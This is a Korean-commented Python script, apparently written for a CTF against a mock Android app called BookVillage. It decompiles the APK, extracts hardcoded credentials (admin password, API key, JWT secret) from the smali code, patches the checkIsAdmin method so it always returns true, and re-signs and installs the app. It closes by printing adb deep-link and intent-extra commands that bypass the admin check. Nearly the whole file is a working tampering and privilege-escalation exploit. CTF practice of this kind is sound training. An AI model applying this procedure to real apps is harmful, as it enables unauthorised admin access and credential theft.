"""
Phase 1: BookVillage APK Smali 패치 자동화 스크립트
=======================================================
사용법:
    python patch_apk.py [app-debug.apk]

기능:
    1. apktool 으로 APK 디컴파일
    2. Smali 파일에서 checkIsAdmin 메서드 자동 탐색
    3. if-eqz → if-nez 패치 (관리자 분기 반전)
    4. apktool 으로 재패키징
    5. jarsigner 로 서명
    6. adb install 로 설치
"""

import os
import sys
import subprocess
import shutil
import re

# ── 설정 ──────────────────────────────────────────────────────────────
APK_IN       = sys.argv[1] if len(sys.argv) > 1 else "app-debug.apk"
DECOMPILE_DIR = "bv_decompiled"
PATCHED_APK  = "bv_patched.apk"
ALIGNED_APK  = "bv_patched_aligned.apk"
KEYSTORE     = "ctf.keystore"
KS_PASS      = "ctf1234"
KS_ALIAS     = "ctf"

BANNER = """
╔══════════════════════════════════════════════╗
║   BookVillage APK Smali Patcher - Phase 1   ║
╚══════════════════════════════════════════════╝
"""

def run(cmd, check=True):
    print(f"\n▶ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=False, text=True)
    if check and result.returncode != 0:
        print(f"[ERROR] 명령 실패 (exit {result.returncode})")
        sys.exit(1)
    return result

def step(n, msg):
    print(f"\n{'═'*50}")
    print(f"  STEP {n}: {msg}")
    print(f"{'═'*50}")

# ── STEP 0: 사전 확인 ──────────────────────────────────────────────
print(BANNER)
step(0, "사전 확인")

if not os.path.exists(APK_IN):
    print(f"[ERROR] APK 파일을 찾을 수 없습니다: {APK_IN}")
    print("  사용법: python patch_apk.py <apk경로>")
    sys.exit(1)

for tool in ["apktool", "java"]:
    if shutil.which(tool) is None:
        print(f"[ERROR] {tool} 이 PATH에 없습니다. 설치 후 다시 실행하세요.")
        sys.exit(1)

print(f"  대상 APK : {APK_IN}")
print(f"  출력 APK : {PATCHED_APK}")

# ── STEP 1: APK 디컴파일 ───────────────────────────────────────────
step(1, "apktool 디컴파일")

if os.path.exists(DECOMPILE_DIR):
    shutil.rmtree(DECOMPILE_DIR)

run(f'apktool d "{APK_IN}" -o "{DECOMPILE_DIR}" -f')

# ── STEP 2: 크레덴셜 추출 (Smali 검색) ────────────────────────────
step(2, "Smali 에서 하드코딩 크레덴셜 탐색")

smali_root = os.path.join(DECOMPILE_DIR, "smali", "com", "bookvillage", "mock")
credentials = {}

cred_patterns = {
    "ADMIN_PASSWORD" : r'const-string [vp]\d+, "admin1234"',
    "API_KEY"        : r'const-string [vp]\d+, "bv-internal-2024-secret"',
    "JWT_SECRET"     : r'const-string [vp]\d+, "bv-jwt-signing-key-do-not-share"',
    "DB_PASSWORD"    : r'const-string [vp]\d+, "1234"',
    "ADMIN_USERNAME" : r'const-string [vp]\d+, "admin"',
    "BACKEND_URL"    : r'const-string [vp]\d+, "http://book-village',
}

for root, dirs, files in os.walk(smali_root if os.path.exists(smali_root) else DECOMPILE_DIR):
    for fname in files:
        if not fname.endswith(".smali"):
            continue
        fpath = os.path.join(root, fname)
        with open(fpath, encoding="utf-8", errors="ignore") as f:
            content = f.read()
        for cred_name, pattern in cred_patterns.items():
            m = re.search(pattern, content)
            if m and cred_name not in credentials:
                value = re.search(r'"([^"]+)"', m.group()).group(1)
                credentials[cred_name] = (value, fname)

print("\n  [+] 발견된 하드코딩 크레덴셜:")
for name, (val, fname) in credentials.items():
    print(f"      {name:20s} = \"{val}\"  (from {fname})")

if not credentials:
    print("  [-] 크레덴셜을 찾지 못했습니다. (APK가 다를 수 있음)")

# ── STEP 3: checkIsAdmin Smali 패치 ───────────────────────────────
step(3, "checkIsAdmin 메서드 Smali 패치 (if-eqz → if-nez)")

patch_count = 0
patched_files = []

# Smali 전체 탐색
search_root = smali_root if os.path.exists(smali_root) else DECOMPILE_DIR

for root, dirs, files in os.walk(search_root):
    for fname in files:
        if not fname.endswith(".smali"):
            continue
        fpath = os.path.join(root, fname)
        with open(fpath, encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # checkIsAdmin 메서드 블록 찾기
        if "checkIsAdmin" not in content:
            continue

        print(f"\n  [!] 패치 대상 발견: {fname}")

        # 방법 1: if-eqz → if-nez 반전
        new_content = content

        # equalsIgnoreCase + if-eqz 패턴 찾기
        pattern_eqz = re.compile(
            r'(invoke-virtual \{[vp]\d+, [vp]\d+\}, Ljava/lang/String;->equalsIgnoreCase\(Ljava/lang/String;\)Z\s+'
            r'move-result [vp]\d+\s+)'
            r'(if-eqz)',
            re.MULTILINE
        )

        if pattern_eqz.search(new_content):
            new_content = pattern_eqz.sub(r'\1if-nez', new_content)
            print(f"  [+] 패치 성공: if-eqz → if-nez (equalsIgnoreCase 분기 반전)")
            patch_count += 1
        else:
            # 방법 2: checkIsAdmin 메서드 전체를 항상 true로 교체
            method_pattern = re.compile(
                r'(\.method private checkIsAdmin\(Ljava/lang/String;\)Z)'
                r'.*?'
                r'(\.end method)',
                re.DOTALL
            )
            if method_pattern.search(new_content):
                replacement = (
                    r'\1\n'
                    '    .registers 2\n\n'
                    '    # [PATCHED] always return true\n'
                    '    const/4 v0, 0x1\n'
                    '    return v0\n\n'
                    r'\2'
                )
                new_content = method_pattern.sub(replacement, new_content)
                print(f"  [+] 패치 성공: checkIsAdmin 전체 교체 (항상 true 반환)")
                patch_count += 1
            else:
                print(f"  [-] 패치 패턴을 찾지 못함: {fname}")
                continue

        with open(fpath, "w", encoding="utf-8") as f:
            f.write(new_content)
        patched_files.append(fpath)

if patch_count == 0:
    print("\n  [!] checkIsAdmin 패치 대상을 찾지 못했습니다.")
    print("       수동으로 smali 파일을 확인하세요:")
    print(f"       grep -r 'checkIsAdmin' {DECOMPILE_DIR}/smali/")
else:
    print(f"\n  [+] 총 {patch_count}개 패치 완료: {patched_files}")

# ── STEP 4: 재패키징 ───────────────────────────────────────────────
step(4, "apktool 재패키징")
run(f'apktool b "{DECOMPILE_DIR}" -o "{PATCHED_APK}" --use-aapt2')

# ── STEP 5: 서명 키 생성 ───────────────────────────────────────────
step(5, "서명 키 생성 (없는 경우)")
if not os.path.exists(KEYSTORE):
    run(
        f'keytool -genkey -v '
        f'-keystore {KEYSTORE} '
        f'-alias {KS_ALIAS} '
        f'-keyalg RSA -keysize 2048 -validity 10000 '
        f'-dname "CN=CTF,OU=CTF,O=CTF,L=Seoul,S=Seoul,C=KR" '
        f'-storepass {KS_PASS} -keypass {KS_PASS}'
    )
    print(f"  [+] 키스토어 생성: {KEYSTORE}")
else:
    print(f"  [*] 기존 키스토어 사용: {KEYSTORE}")

# ── STEP 6: APK 서명 ───────────────────────────────────────────────
step(6, "APK 서명")
run(
    f'jarsigner -verbose '
    f'-sigalg SHA1withRSA -digestalg SHA1 '
    f'-keystore {KEYSTORE} '
    f'-storepass {KS_PASS} '
    f'"{PATCHED_APK}" {KS_ALIAS}'
)

# zipalign
zipalign_path = shutil.which("zipalign")
if zipalign_path:
    if os.path.exists(ALIGNED_APK):
        os.remove(ALIGNED_APK)
    run(f'zipalign -v 4 "{PATCHED_APK}" "{ALIGNED_APK}"', check=False)
    final_apk = ALIGNED_APK
    print(f"  [+] zipalign 완료: {ALIGNED_APK}")
else:
    final_apk = PATCHED_APK
    print(f"  [*] zipalign 미설치 → 서명된 APK 사용: {PATCHED_APK}")

# ── STEP 7: ADB 설치 ───────────────────────────────────────────────
step(7, "adb install")
adb_path = shutil.which("adb")
if adb_path:
    result = run(f'adb install -r "{final_apk}"', check=False)
    if result.returncode == 0:
        print("  [+] 설치 성공!")
    else:
        print(f"  [!] adb install 실패. 수동으로 설치하세요:")
        print(f"      adb install -r \"{final_apk}\"")
else:
    print(f"  [!] adb 미설치. 수동으로 설치하세요:")
    print(f"      adb install -r \"{final_apk}\"")

# ── 완료 요약 ──────────────────────────────────────────────────────
print(f"""
{'═'*50}
  ✅ 패치 완료!
{'═'*50}
  패치된 APK : {final_apk}

  [추출된 크레덴셜]""")
for name, (val, _) in credentials.items():
    print(f"    {name:20s} = \"{val}\"")

print(f"""
  [패치 내용]
    checkIsAdmin() → 항상 true 반환
    → 일반 계정 로그인 시에도 관리자 버튼 노출

  [다음 단계]
    1. 앱 실행 → 일반 계정 로그인
    2. 관리자 버튼 클릭 → AdminPanelActivity 진입
    3. 웹 관리자 패널 열기 → 팝업 등록 (Phase 2)

  [또는 adb 직접 우회 (패치 불필요)]
    # XOR 바이패스 토큰
    adb shell am start -a android.intent.action.VIEW \\
      -d "bookvillage://admin-panel?token=BV-BYPASS-KEY-2024" \\
      com.bookvillage.mock

    # Intent Extra 주입
    adb shell am start \\
      -n com.bookvillage.mock/.AdminPanelActivity \\
      --es admin_token "x-x-x-admin-x-x"
{'═'*50}
""")
